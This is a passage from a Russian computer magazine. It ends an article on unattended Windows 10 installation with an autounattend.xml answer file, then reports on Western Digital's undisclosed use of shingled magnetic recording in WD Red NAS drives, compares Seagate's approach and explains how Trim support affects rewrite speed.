в образе Windows не так‐то просто: такое ощу щение, что программу раз‐
рабатывали инопланетяне, специально решившие запутать человечество.
Но есть решение: можно использовать готовый файл autounattend.xml,
созданный для русской 64‐раз рядной версии Windows 10 (для английской
версии нужно в параметре <UILanguage> ука зать значение en_US).


<?xml version="1.0" encoding="utf‐8"?>
<unattend xmlns="urn:schemas‐microsoft‐com:unattend">
  <settings pass="windowsPE">
      <component name="Microsoft‐Windows‐International‐Core‐WinPE"
processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35"
language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.
microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/
2001/XMLSchema‐instance">
          <InputLocale>en‐US; ru‐RU</InputLocale>
          <SystemLocale>ru‐RU</SystemLocale>
          <UILanguage> ru‐RU</UILanguage>
          <UserLocale> ru‐RU</UserLocale>
      </component>
      <component name="Microsoft‐Windows‐Setup" processorArchit
ecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral"
versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMICon
fig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema‐instance"
>
          <UserData>
              <ProductKey>
                  <Key></Key>
              </ProductKey>
              <AcceptEula>true</AcceptEula>
          </UserData>
      </component>
  </settings>
  <settings pass="oobeSystem">
      <component name="Microsoft‐Windows‐International‐Core" proces
sorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language=
"neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.
com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSch
ema‐instance">
          <InputLocale>en‐US; ru‐RU</InputLocale>
          <SystemLocale>ru‐RU</SystemLocale>
          <UILanguage>ru‐RU</UILanguage>
          <UserLocale>en‐US</UserLocale>
      </component>
      <component name="Microsoft‐Windows‐Shell‐Setup" processorArchit
ecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral"
versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMICon
fig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema‐instance"
>
          <OOBE>
              <HideOnlineAccountScreens>true</HideOnlineAccou
ntScreens>
              <ProtectYourPC>3</ProtectYourPC>
          </OOBE>
          <UserAccounts>
              <LocalAccounts>
                  <LocalAccount wcm:action="add">
                      <Group>Administrators</Group>
                      <Name>Administrator</Name>
                      <!‐‐ <Password>
                          <Value>password</Value>
                          <PlainText>true</PlainText>
                      </Password> ‐‐>
                  </LocalAccount>
              </LocalAccounts>
          </UserAccounts>
         <!‐‐ <AutoLogon>
              <Password>
                  <Value>password</Value>
                  <PlainText>true</PlainText>
              </Password>
              <Username> Administrator</Username>
              <LogonCount>1</LogonCount>
              <Enabled>true</Enabled>
          </AutoLogon> ‐‐>
      </component>
  </settings>
</unattend>

В этом файле поле для ввода ключа продукта оставлено пустым: если исполь‐
зуемый тобой образ Windows вклю чает несколько редакций, программа уста‐
новки предложит выбрать нужную. На компь юте рах с UEFI ключ продукта уста‐
новщик автоматически подхва тит из энергонезависимой памяти (при его
наличии). Также можно вбить ключ прямо в поле Key, тогда система активиру‐
ется автоматически с этим ключом, как только машина соединится с интерне‐
том.
  При инсталляции создается локальная учетная запись с именем Adminis‐
trator. Строки, обеспечивающие соз дание пароля для этой учетной записи,
закомментированы, поэтому инсталлятор попросит его ввести (это поле мож‐
но будет оставить пустым). Ты можешь убрать теги комментария и задать
пароль прямо в файле, а заодно можно раскомментировать секцию, отве‐
чающую за автоматический вход в систему с локальной учетной записью.
Этап создания учетной записи Microsoft про пус кается — за это отвечает тег


<HideOnlineAccountScreens>true</HideOnlineAccountScreens>

С использованием этого файла ответов тебе придет ся указать дисковый раз‐
дел, в который планируется установить систему, и ответить на парочку допол‐
нительных вопросов программы уста новки. Весь остальной процесс инстал‐
ляции пройдет без твоего участия.


        WWW

                    Вместо ADK ты можешь воспользоваться онлай‐
                     новым генератором файлов авто матической уста‐
                       новки Windows, который так и называется: Win‐
                     dows Answer File Generator. В разделе Desktop
                      или  Server выбери  подходящую  версию ОС,
                       заполни форму на открывшейся странице и ско‐
                      пируй сгенерирован ный код, сохранив его в файл
                   autounattend.xml.



ПОДГОТОВКА ДИСТРИБУТИВА К УСТАНОВКЕ СИСТЕМЫ
Файл autounattend.xml должен располагаться в корне носите ля, с которого
устанавливается Windows. Если ты устанавлива ешь систему с флешки, ско‐
пируй autounattend.xml в ее кор невую пап ку. Проследи за тем, чтобы в пап‐
ке sources располагался файл install.wim, с использованием которого был
создан файл ответов.
   Если сохранить файл ответов в корневой папке не получилось (или ты
решил  дать ему  другое  имя), можно  запус тить  инсталляцию Windows
из командной строки, указав программе установки место расположе ния фай‐
ла:


setup.exe /unattend:filename

где filename — полное имя файла с ответами с учетом пути. Если ты устанав‐
ливаешь систему с оптичес кого или виртуального диска, для чего тебе пот‐
ребуется ISO‐образ, придется переупаковать его заново, поместив в кор‐
невую папку файл autounattend.xml и install.wim в папку sources.
Для этого можно воспользовать ся подходящей утилитой, например прог‐
раммой UltraISO.


ВЫВОДЫ
Автоматизация установки Windows 10 кажется сложной только на первый
взгляд. Если один раз разобраться с Windows SIM, создание файлов ответов
займет не так уж и много времени. Если же хочется решить эту задачу проще
и  быстрее, можно  воспользоваться  онлайновым  генератором,  только
не забудь предварительно про тес тировать установку на виртуальной машине.
Если во вре мя инсталляции воз никли ошиб ки, можно поправить файл
autounattend.xml в любом текстовом редакторе.
ТРЮКИ

  СРЫВАЕМ
  ПОКРОВЫ





                                         Олег Афонин
                                            Эксперт по мобильной
                                          криминалистике компании
                                               «Элкомсофт»
                                               aoleg@voicecallcentral.com




       ЧЕРЕПИЧНАЯ ЗАПИСЬ SMR
     В НАКОПИТЕЛЯХ WD И SEAGATE





До недавнего времени пользователь (по крайней мере —
продвинутый поль зователь, не поленивший ся провести нес‐
колько дней на форумах) четко знал: в потребительских дис‐
ках Seagate используется черепичная запись SMR, и это
плохо, а в дис ках Western Digital — нет. Многие и многие
пользователи делали свой выбор, исхо дя имен но из этого
критерия.  Но  недав нее  журналистское  расследование
перевернуло их мир.


Оказалось (а точнее — официально подтвердилось), что Western Digital давно
и молча продает диски с SMR, наотрез отказыва ясь раскрыть эту информа‐
цию недоумевающим и воз мущен ным владель цам «рассыпавшихся» RAID‐
массивов. В чем суть скандала, почему использование черепичной записи
вызвало такое возмущение пользователей и в чем различие подходов WD
и Seagate? Попробуем разобраться.


СКАНДАЛЬНАЯ ЧЕРЕПИЦА
Если ты не следишь внимательно за новос тями в области средств хранения
информации, недавние события могли пройти мимо тебя. Хронология такова.


2 апре ля
Все началось с исследования Кристиана Франке (Christian Franke). Он под‐
робно, с выкладками и отчетами, рас сказал, что в некоторых дисках WD Red,
предназначенных для использования в мно годис ковых сетевых хранилищах
NAS, применяется недоку ментированная технология SMR (Shingled Magnetic
Recording — черепичная запись) и о том, какие именно проблемы воз никают
из‐за этого в рамках массивов. Из‐за хорошо извес тных особенностей тех‐
нологии использование дисков с SMR совместно с «обычными» дисками
(CMR, Conventional Magnetic Recording) при водило к деградации мас сивов
и выпадению из них дисков с SMR. Более того, вос становить такие массивы
оказывалось невозможно из‐за постоянных повторных выпадений дис ка
с SMR.
   Это иссле дование не было первым, вто рым и даже десятым звоночком.
Вопросом «не SMR ли это?» пользователи начали задаваться уже давно. Нап‐
ример, в ветке обсуждения на Reddit «WD Red 6tb WD60EFAX SMR? Bad for
Existing raid in DS918+ with WD Red 6tb WD60EFRX PMR drives?» уже обсужда‐
лась эта проблема. При желании на том же Reddit можно найти несколько
десятков подобных обсуждений.
  Все было бы неплохо, если бы про изво дитель упоминал об этой особен‐
ности. И даже терпимо, если бы про изво дитель просто отве тил «да» на пря‐
мой вопрос: используется ли в модели Х технология SMR? Увы, но единствен‐
ный ответ, который получали пользователи, был таков: «Мы не раз глашаем
особенности внутреннего функционирова ния наших дисков конечным пот‐
ребителям». Вот цитата ответа из техподдержки:



             I understand your concern regarding the PMR and SMR specifications
       of your WD Red drive.
         Please be informed that the information about the drive is whether use
       Perpendicular Magnetic Recording (PMR) or Shingled Magnetic Recording
      (SMR), is not something that we typically provide to our customers.  I am
       sorry for the inconvenience caused to you.
        What  I can tell you that the most products shipping today are Conven-
        tional Recording (PMR). We began shipping SMR (Shingled Magnetic
       Recording) at the start of 2017. For more information please refer the link
      mentioned below.

Вот другой вариант ответа — то же самое, дру гими словами.



     We have received your inquiry whether internal WD Red drive WD40EFAX
      would use SMR technology. I will do my best here to assist and please ac-
       cept our sincere apologies for the late reply.
         Please note that information on which of our drives use PMR or SMR
         is not public and is not something that we typically provide to our cus-
       tomers. What we can tell you is that most WD products shipping today are
       Conventional Recording (PMR) — please see additional information below.
      However, we began shipping SMR (Shingled Magnetic Recording) at the
        start of 2017.
       Ис точник

Вольный перевод: «Обращаем ваше внимание, что информация об исполь‐
зовании PMR и SMR не является пуб лично дос тупной и не разглашается
нашим клиентам. Однако могу сказать, что боль шая часть поставля емых WD
продуктов использует CMR; ниже — дополнительная информация. Тем
не менее в начале 2017 года мы начали отгружать диски с SMR».
  Примерно такой ответ получил Кристиан Франке. Кристиан на этом
не остановился, получив в результате такой ответ:



       Just a quick note. The only SMR drive that Western Digital will have in pro-
       duction is our 20TB hard enterprise hard drives and even these will not
      be rolled out into the channel.
             All of our current range of hard drives are based on CMR Conventional
      Magnetic Recording.
          With SMR Western  Digital would make  it very clear as that format
       of hard drive requires a lot of technological tweaks in customer systems.
          With regards,
        Yemi Elegunde
       Enterprise & Channel Sales Manager UK
      Western Digital®
    WDC UK, a Western Digital company

В ответе утверждается, что единственный диск WD с SMR — это накопитель
на 20 Тбайт, предназначенный для дата‐центров. По утвержде нию предста‐
вителя WD, все остальные диски WD используют CMR.
   Дальнейшие попытки добиться хоть какой‐то внятной информации при‐
вели к предложению «обсу дить проблему с инженерами и специалис тами
по жестким дискам в телеконференции». Телеконференция, впрочем, так и не
состоялась. Пользователи обратились к журналис там.


14 апре ля
Итак, Кристиан написал журналистам специализированного издания Blocks &
Files. Журналисты разоб рались в проблеме и выпустили статью Western Digital
admits 2TB‐6TB WD Red NAS drives use shingled magnetic recording.
  Почему SMR в предназна ченных для NAS дис ках — это проблема?
В  статье приводится несколько примеров. В частности, пользователи,
которые заменяли вышедшие из строя диски WD Red 6TB на новые модели
WD60EFAX, получали атипично длительное время перес троения массивов
SHR 1 и RAID 5 (от двух до вось ми дней). У некоторых пользователей перес‐
троение и вовсе завершалось с ошиб кой: новый диск попросту исключался
из массива как неисправный. Очевидно, что новые диски работают в разы
хуже в сравнении с предыдущей моделью, а в некоторых случаях не выпол‐
няют заявленную задачу вовсе. Обман потребителя в полный рост — но пред‐
ставители Western Digital до сего дня отказыва лись как‐либо комментировать
ситуацию.
  И вот впервые журналис там удалось получить от Western Digital внятный
и конкретный ответ: «Актуальные модели WD Red 2–6 Tбайт компании Western
Digital используют drive‐managed SMR (DMSMR). Диски WD Red 8–14 Tбайт
основаны на CMR. <…> Вы правы в том, что мы не указываем технологию
записи в документации на диски WD Red. <…> При тестировании дисков WD
Red мы не обнаружили проблем с перес троением RAID из‐за технологии
SMR».
  В свое оправдание WD приводит следующий аргу мент: «В типичной среде
домашних NAS и NAS для малого биз неса типичные нагрузки скачкооб разны,
это оставляет достаточно времени для сбора мусора и дру гих сервисных опе‐
раций». Журналисты из Blocks & Files возразили, что далеко не все нагрузки
в рамках сетевых хранилищ «типичны» с точки зрения производителя. Скан‐
дал продолжал развивать ся.


15 апре ля
Статья попала в точку: у многих пользователей, что называется, наболе ло.
Вызванная в Сети вол на публикаций по следам оригинальной статьи побуди‐
ла Blocks & Files продол жить рас следование.
  В статье Shingled hard drives have non‐shingled zones for caching writes рас‐
сказывается о «лен точной» орга низа ции черепичного хранилища, как и о том,
что у каждого SMR‐накопителя есть буфер, использующий клас сическую
запись CMR. Здесь прямая ана логия с современными накопителями SSD:
есть медленная TLC или даже QLC NAND, но  часть ее используется
для буферизации записей в качестве псевдо‐SLC‐кеша. Так и здесь: в жес‐
тких дисках с черепичной записью SMR есть области CMR, использующиеся
для ускорения записи. У пользователя, который тестирует диск популярным
пакетом CrystalDiskMark, воз никает иллюзия нормальнос ти: диск и читает,
и пишет данные без каких‐либо сюр призов.
  Сюрприз обнаруживается тогда, когда объем записанных данных пре‐
вышает размер области CMR или весь диск заполняется данными, после чего
накопителю приходится на лету «уплотнять» информацию. Такие ситуации
в рамках NAS могут возникать как минимум в двух случаях: при перестроении
массива класса RAID 5 и подобных, в которых используются контрольные сум‐
мы, и при записи большого объема данных (например, соз дание и сох‐
ранение на диск обычной резервной копии). В таких сценариях видимая сна‐
ружи скорость записи падает в разы, а то и на один‐два порядка. В моих
собственных тестах скорость записи при переза писи запол ненного накопи‐
теля падала до 1–10 Мбайт/с при записи единственного файла объ‐
емом 1,5 Тбайт (резервная копия моей системы). Я нахожу такую скорость
неприемлемой.
  В той же статье автор рас сказал и о том, что происходит при попытке
перестроить массив RAID 5/6, если новый диск использует SMR. Огромное
количество операций случайного ввода‐вывода быстро вызывает перепол‐
нение области CMR; контроллер не успевает справиться с нагрузкой, воз вра‐
щая ошибку отказа в обслуживании. Спустя короткое время (порядка сорока
минут) диск пол ностью ухо дит в себя, а контроллер RAID исключает его
из массива, помечая как неисправный.
   Что интересно, ничего подоб ного не происходит при использовании дру‐
гих типов массивов — RAID 0/1, а также при соз дании нового мас сива RAID
5/6. Создается впечатление, что разработчики Western  Digital попросту
не проверили новые диски в сценарии перестроения массива RAID 5/6, огра‐
ничившись простейшими сценариями.


15 апре ля
В очередной статье Seagate ‘submarines’ SMR into 3 Barracuda drives and a
Desktop HDD журналисты продолжили экс плуатировать тему SMR, рассказав,
что подобной практикой занимается и компания Seagate.
   Seagate давно исполь зует SMR в сво их накопи телях 2,5", архивных Archive
и десктопных Barracuda. Компания никогда не скрывала эту информацию.
В то же время диски Seagate, предназначенные для работы в NAS (линейки
IronWolf и IronWolf Pro), SMR не используют, что, собственно, и подтвердила
компания. Таким обра зом, скандала не получи лось: покупатель, который
хотя бы минимально интересуется сос тоянием дел, всегда имеет воз‐
можность понять, какой именно диск он покупает и для чего. Особенности
SMR описаны Seagate в технической документации  к соответству ющим
накопителям; о них мы еще поговорим, пока же вернемся к хронологии.


16 апре ля
На следующий день журналисты выяснили, что и в некоторых дисках Toshiba
также используется SMR: Toshiba desktop disk drives have shingles too. Не уве‐
рен, что это кому‐то интерес но: доля накопителей Toshiba в типораз мере 3,5"
исчезающе мала. Впрочем, ознакомиться со списком моделей дис ков Toshi‐
ba, в которых исполь зуется SMR, в любом слу чае не помешает. На сегод‐
няшний день это 3,5‐дюймовые диски Toshiba P300 Desktop PC и DT02 объ‐
емом 4 и 6 Тбайт, а также все без исключения 2,5‐дюймовые модели поколе‐
ния MQ04.


20 апре ля
В Western Digital определен но напряглись и забес покоились. В статье SMR
in disk drives: PC vendors also need to be transparent опубликован официальный
ответ Western Digital, в котором компания уверяет, что никаких проблем у дис‐
ков на самом деле нет, если их правильно использовать. Более све жую вер‐
сию ответа можно прочесть в блоге Western Digital. Из текста можно сделать
вывод, что перестроение массивов RAID 5/6 для дисков серии WD Red —
неправильное использование, не надо так делать. И вообще, NAS и RAID
совершенно не эквивалентные понятия, не надо их путать. Если пользователь
хочет приспособить диск для NAS в составе мас сива RAID 5/6, то пусть берет
что‐нибудь подороже — например, из линейки Ultrastar DC, или вот WD Gold,
или хотя бы WD Red Pro. Честное сло во, именно так и написано: If you are en‐
countering performance that is not what you expected, please consider our prod‐
ucts designed for intensive workloads. These may include our WD Red Pro or WD
Gold drives, or perhaps an Ultrastar drive. Не буду цитировать целиком этот
результат работы департамента Western  Digital по связям с обществен‐
ностью, с ним можно ознакомиться по ссылке выше.


21 апре ля
Разумеется, основной конкурент — компания Seagate не смогла не проком‐
ментировать ситуацию. В статье Seagate says Network Attached Storage
and SMR don’t mix предста витель компании подчеркивает, что Seagate никог‐
да не использовала черепичную запись в дисках IronWolf и IronWolf Pro, пред‐
назначенных для NAS, и не рекомендует использовать диски с SMR в сетевых
хранилищах.
  Впрочем, как мы знаем, Seagate тоже не сообщала покупателям десктоп‐
ных дисков Barracuda о том, что в них исполь зуется черепичная запись, —
для огромного количества пользователей это стало неприятным сюрпризом.





23 апре ля
Журналисты не смогли пройти мимо поста WD. В статье Western Digital implies
WD Red NAS SMR drive users are responsible for overuse problems задаются
вполне резонные вопросы: а как, собственно, поль зователь может — даже
в теории! — узнать о потенциальных проб лемах, если WD хранила сам факт
использования SMR в NAS‐накопителях в секрете? И если уж вы обвиняете
пользователей в «неправильном» использовании дис ков, то, пожалуйста,
определите фор мально «правильные» и «неправильные» сценарии для каж‐
дой конкретной модели. Вот в старом WD60EFRX, например, перестроение
RAID 5/6 было «правильным» сценарием, а в новой WD60EFAX стало «неп‐
равильным» — с этим можно жить, но… Но клиентам об этом сообщить
забыли, при этом отказываясь отвечать на заданные недоумевающими поль‐
зователями вопросы.


24 апре ля
В Western Digital сдались: компания опуб ликова ла пол ный спи сок накопи‐
телей в форм‐факторе 3,5", в которых используется SMR.





Технология черепич ной записи остается в накопителях WD Red, пред назна‐
ченных для NAS, но производитель пос ле беспрецедентного давления
общественности нехотя и с оговорками сог ласился больше не устраивать
из этого секрета. Теперь ты можешь сделать информированный выбор:
покупать «старую» модель WD Red без SMR или «новую» с SMR. Или уйти
к конкуренту, который не использует SMR в накопителях для NAS вовсе.
Или взять наполненный гелием диск объемом от 8 Тбайт.
  А пока общественность торжеству ет, давай посмотрим на то, как же
обстоит дело с дисками, использующими технологию черепичной записи,
можно ли считать их абсолютным злом, или в некоторых сце нариях экономия
оправданна.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
  СРЫВАЕМ ПОКРОВЫ
           ЧЕРЕПИЧНАЯ ЗАПИСЬ SMR В НАКОПИТЕЛЯХ
                           WD И SEAGATE





РЕАЛИЗАЦИЯ SMR У SEAGATE: ПРИВЫЧНОЕ ЗЛО
Проще всего с Seagate. Покупая диск Seagate, ты, скорее всего, получишь
модель с черепич ной записью. На сегодняшний день  (ситуация может
поменяться, и очень быс тро) дела в стане Seagate обстоят следующим обра‐
зом.
  Линейки Seagate Archive и Barracuda Compute: как правило, SMR. Именно
такие диски устанавливаются во внешние накопители линеек Expansion Desk‐
top и Backup Plus Hub емкостью до 8 Тбайт включительно.
  Линейка Barracuda Pro обходится без SMR. Кстати, все диски Seagate
объемом от 10 Тбайт также используют обычный способ записи CMR;
это объясняет заметную разницу в цене между моделя ми внешних накопи‐
телей Seagate на 8 и 10 Тбайт.
  Во всех дисках для NAS линеек IronWolf и IronWolf Pro используется чес тная
перпендикулярная запись (CMR).
   Что такое черепич ная запись? Подробная иллюстрированная  статья
выложена на сайте Seagate — очень рекомендую ознакомиться.
  При  черепичном  спо собе  записи  дорожки  записы ваются  на  диск
не параллельно, а с перехлестом, как черепицы на кры ше, что позволяет
дополнительно  уплотнить  запись. Использование  черепичного способа
записи позволяет сэкономить на производстве, сделать диск менее шумным
и менее тяжелым за счет меньшего количес тва вращающихся «блинов»
и головок чтения‐записи.
  А что насчет надежности дисков с SMR? Когда технология только появи‐
лась на рынке, у пользователей были большие сомнения относительно дол‐
говременной надежности таких дисков. На сегодняшний день можно конста‐
тировать, что надежность дисков с SMR при обычном использовании в качес‐
тве архивных накопителей не ниже надеж ности дис ков с CMR аналогичной
емкости, а в отдельных случаях может даже превышать ее благодаря упро‐
щению механической час ти.
  Особенность реализации SMR у Seagate в том, что диски выдерживают
хорошую скорость записи на протяжении первого цикла запол нения дис ка.
Но стоит тебе заполнить диск целиком и начать перезаписы вать данные (сце‐
нарий, совершенно типичный для регулярных резервных копий), как скорость
перезаписи падает в разы по сравнению с записью на свежий диск. Ситуация
чем‐то напоминает ту, в которой оказались производители первых твер‐
дотельных накопителей SSD: запись в блок про исходит быстро, а для переза‐
писи единственного байта требуется считать целый (и довольно крупный)
блок данных, модифицировать нуж ные данные и сохранить измененную
информацию. Так и здесь: для переза писи единс твенной дорожки надо сна‐
чала считать все последу ющие дорожки, которые входят в объединенный
блок (ленту), после чего записать нужную дорожку и восстановить из буфера
все последующие.
   Вот что имеет на эту тему ска зать производитель Seagate:



     C  технологией SMR  связана  сле дующая  проблема:  если  нужно
      переза писать либо обновить часть информа ции, переписать придется
      не только тре буемый фрагмент, но и данные на пос леду ющих дорож-
       ках. Пос кольку записы вающий эле мент шире неперек рыва ющейся
      области дорожки, он захватыва ет так же данные на гра нича щих дорож-
       ках, а зна чит, потом придется переза писать и их (рис. 3). Таким обра-
      зом, при изме нении данных на нижней дорожке нужно скор ректи-
      ровать данные на ближайшей наложенной дорожке, потом на сле-
     дующей и так далее, пока не будет переписана вся плас тина.





  Рис. 3. Записывающий элемент перекрыва ет накладывающиеся дорожки



     По этой причине дорожки SMR-дис ка объединены в небольшие груп-
      пы, называ емые лентами. Нак ладыва ются друг на дру га, соответс-
      твенно, только дорожки в пре делах одной ленты (рис. 4). Бла года ря
      такому груп пирова нию в слу чае обновле ния некоторых данных переза-
      писы вать придется не всю плас тину, а лишь огра ниченное количес тво
      дорожек, что сущес твенно упрощает и ускоряет процесс.





                   Рис. 4. Структура ленты на SMR‐диске

Такая организация приводит к тому, что скорость перезаписи данных падает
с условных 180 Мбайт/с до 40–50 Мбайт/с. Обойти проблему можно
попытаться, включив для диска кеширование записи и записывая крупными
блоками, размер которых не мень ше раз мера одной ленты. Так, тестовый
образец LaCie 2,5" 4 Tбайт демонс трировал скорость записи на чистый
накопитель порядка 130 Мбайт/с. Пос ле первого заполнения диска скорость
записи данных упала до 20–40 Мбайт/с; что характерно, не помогло ни фор‐
матирование диска, ни перераз бивка на раз делы. Еще хуже себя показал
вариант емкостью 5 Тбайт, ско рость перезаписи данных которого упала
ниже 10 Мбайт/с. Частично исправить дело помогло включение кеширования
записи и запись данных крупными блоками; впрочем, даже так первоначаль‐
ная высокая скорость записи не вос становилась.
  Проиллюстрирую работу SMR в момент перезаписи данных. Сразу скажу:
увидеть такие цифры получится лишь пос ле того, как весь объ ем диска был
запол нен хотя бы единожды, а объем записываемых в течение одной сессии
данных превышает размер буфера CMR (при этом очис тка или перефор‐
матирование диска никак не повлияют на про изводительность). На первом
скриншоте — запись с отключенным кешированием записи. Скорость записи
скачет от 0 до 10 Мбайт/с. Эта скорость обнажает внутреннюю суть процес‐
са. Что происходит: контроллер считыва ет лен ту (блок черепичных дорожек)
в буфер, модифицирует одну дорожку, записывает всю ленту из буфера
на диск. Следующая дорожка — повторение того же самого. В результате
имеем процесс, который на Reddit описали так: «Мно гие говорят, что SMR —
это медленно, но мало кто представляет, нас колько медленно это на самом
деле. Представьте, что вам нужно пропихнуть слона через замочную сква‐
жину. Представили? А теперь представь те, что с дру гой стороны активно соп‐
ротивляются. Вот это и будет запись SMR».





         Скорость переза писи с отключенным кешем на запись

На втором скриншоте — то же самое, но с вклю ченным кешированием
записи. Теперь в буфер накопителя попадает не дорожка, а вся лента
целиком (ну, может попадать — фактический размер ленты и то, как он соот‐
носится с размером буфера накопителя, мы не зна ем). Если бы накопитель
был умным (или хотя бы поддерживал Trim, как в WD), то он понял бы, что нуж‐
но перезаписать всю ленту целиком, — и сделал бы именно это. Но нет, он
снова читает ленту в буфер, пос ле модифициру ет данные и записывает их
обратно. Скорость записи в результате ска чет от нуля до максимальной (око‐
ло 100 Мбайт/с в этой части диска).





          Скорость переза писи с включенным кешем на запись

На скриншотах хорошо видна одна из проблем накопителей с SMR: чрез‐
вычайно медленная переза пись больших массивов данных. Учитывая, что
такие диски (на скриншоте — модель Seagate Backup Plus 5TB) часто про‐
даются для хранения резервных копий, раз мер которых может достигать
от  сотен  гигабайт до нескольких  терабайт,  такая производительность
на основной (и, по сути, единственной) задаче устройства совершенно неп‐
риемлема.
  А что насчет скорости чтения? Хорошо извес тная проблема SMR — низ кая
скорость позиционирования головок, связанная с высокой плотностью рас‐
положения дорожек. Соответственно, случайный дос туп к данным, в отличие
от последовательного, при прочих равных условиях в моделях с SMR будет
ниже, чем в дисках без «черепицы». Но на этом проб лемы не заканчиваются.
В дисках с SMR без Trim так же, как и в накопителях SSD, используется
механизм трансляции адресов. Диск старается записать новую порцию дан‐
ных сначала в CMR‐буфер, а когда он заполнен — в первую свободную ленту.
Соответственно, логические адреса транслируют ся в физичес кие; при этом
возникает внутренняя фрагмента ция данных. И если для SSD внутренняя
фрагментация не играет никакой роли, то в слу чае с механичес кими дис ками
мы получаем двой ной удар: файлы «размазываются» по незаня тым лентам
и при этом скорость случайного доступа низкая из‐за увеличенных тре бова‐
ний к точности позиционирова ния головки. В резуль тате при неудачном сте‐
чении обстоятельств мы получаем диск, чтение данных с которого превраща‐
ется в пресловутое пропихивание сло на через замочную скважину.
  Впрочем, модель модели рознь. В упомяну том выше внешнем накопителе
используется диск Seagate Barracuda 5TB (ST5000LM000), который был
одной из первых 2,5‐дюймовых моделей с SMR. Реализация черепичной
записи в нем сырая до невозможности, чем‐то напоминает поведе ние самых
первых SSD, которые моментально теряли в ско рости записи сразу после
первого заполнения. Мое мнение: в таком виде накопитель нельзя было
выпускать на рынок.
  А в каком — можно? Реально ли вообще сделать так, чтобы дис ками
с SMR пользоваться, не испытывая замет ных неудобств? Оказывается, даже
в рамках технологии SMR можно соз давать вполне неплохие дис ки (разуме‐
ется, со своими ограничениями и узким спектром сценари ев использования),
если правильно сделать программную часть — прошивку контроллера.
И получилось это сделать впервые не у Seagate, пионе ра технологии, а у
основного конкурента — компании Western Digital, героя этой статьи.


РЕАЛИЗАЦИЯ SMR ОТ WD: КОМАНДА TRIM, КАК В SSD
На сегодняшний день между реализацией SMR от Seagate и Western Digital
есть одно, но очень важное отличие: поддержка накопителями WD команды
Trim. Использование этой команды меня ет если не все, то многое. Но поз‐
воляет ли поддержка Trim говорить о том, что накопи тели с SMR можно
использовать в рамках RAID‐мас сивов? Раз беремся детально.
  Первые опыты Western Digital в отно шении SMR были сугубо секретными:
компания до сих пор не призналась, исполь зовалась ли эта технология
в модели WD My Passport объемом 4 Тбайт. Боль шинство склоняется к тому,
что да: невысокая скорость случайной записи и низ кая надежность модели
привели к закономерным подоз рениям. Впрочем, уверенности в этом до сих
пор нет ни у кого, даже у техничес ки подкованных специалис тов AnandTech.
Об использовании SMR в этой модели упомина ется вскользь как о веро‐
ятности. Что интересно, в этой модели парамет ры S.M.A.R.T. деклариру ют
поддержку функции Trim, но фактичес ки ее активировать не удается. А вот
в новой модели WD My Passport 5TB (а также WD_Black 5TB) функция Trim
и декларируется, и поддерживается фактически.
   Благодаря поддержке Trim пос ледова тельная запись большого массива
данных всегда выполняется так, как будто данные сохраняются на свежий
накопитель. Вот как выглядит гра фик производитель ности диска WD My Pass‐
port 5TB (с поддержкой Trim).





  Источник: https://www.anandtech.com/show/14849/wd‐my‐passport‐5tb‐
  das‐review‐a‐compact‐capacity‐play‐sans‐smr‐hassles/3

А вот так — график производительности ана логичного диска Seagate (под‐
держки Trim нет).





Как видим, у диска Seagate первые десять минут идет запись в буфер CMR,
после чего начинается бесконечный цикл уплотнения‐перезаписи, из‐за
которого скорость записи то падает до 10 Мбайт/с, то восстанавливается
до максимальной, то сно ва падает. Накопитель от Western Digital подоб ного
поведения не демонстрировал.
   Как проверить, поддерживает ли данный конкретный диск команду Trim?
С одной стороны, можно посмотреть показа ния S.M.A.R.T. С другой — у меня
есть несколько дисков, в параметрах которых поддержка Trim заявлена, но по
факту отсутствует (вероятно, это особенности исполь зованных производите‐
лем USB‐контроллеров). Проверить же можно, запустив PowerShell с адми‐
нистративными привилегиями и выполнив команду


$ Optimize‐Volume ‐DriveLetter X: ‐ReTrim

Если процесс оптимизации успешно начнется, то система выпол няет трим‐
минг накопителя. Если же выдаст ошиб ку — значит, функция Trim не под‐
держивается (кстати, она не поддерживается при использовании любой фай‐
ловой системы, кроме NTFS).
   Казалось бы, при чем здесь Trim — команда, традиционно исполь‐
зующаяся в твердотельных накопителях для упрощения сборки мусора?
  В статье TRIM Command Support for WD External Drives дается подробный
ответ. Согласно этой статье, функция Trim используется для оптимизации
сборки мусора на дисках WD, использующих черепичный способ записи.



     TRIM/UNMAP под держивается для внеш них (И  внутренних,  кста ти,
      тоже — прим.  авт.) жес тких дис ков  с  технологией записи SMR
      для управле ния таблицами соответс твия адре сов и повыше ния про-
      изводительнос ти SMR с течением вре мени. Одним из пре иму ществ
      (Там так и написа но — прим. авт.) черепич ной записи является то, что
      все физичес кие сек тора записы ваются пос ледова тельно в радиальном
      нап равле нии и переза писы ваются только пос ле цик личес кого перено-
       са.  Переза пись  ранее  записанного  логичес кого  блока  приведет
       к тому, что пре дыду щая запись будет помече на как недействительная,
      и логичес кий блок будет записан в сле дующий физичес кий сек тор.
     TRIM/UNMAP поз воляет ОС информировать накопитель о том, какие
      блоки более не используются и могут быть вновь использованы жес-
      тким дис ком для выполнения пос леду ющих опе раций записи на пол-
      ной скорос ти.

Что это означает на практике? Если ты используешь такой диск в Windows 10
(и диск отформатирован в NTFS), то ско рость больших массивов данных
будет оставаться высокой независимо от числа перезаписей. Система авто‐
матически сообщит контроллеру об освобождении адре сов, которые больше
не используются. Соответс твенно, скорость записи будет восстанавливаться
автоматически после удаления файла или форматирования диска — это то,
чего катастрофически не хватает накопителям от Seagate.
   Если речь идет о диске формата 3,5", то некоторые NAS (например, про‐
изводства Synology) также определят его как накопи тель, поддержи вающий
Trim. Ты сможешь настроить работу Trim по рас писанию.





Пусть тебя не введет в заблуждение название пункта SSD Trim: в накопителе
установлен вполне себе механичес кий жесткий диск на 6 Тбайт — как раз
из новой серии WD с черепичной записью. Впро чем, у этого метода есть
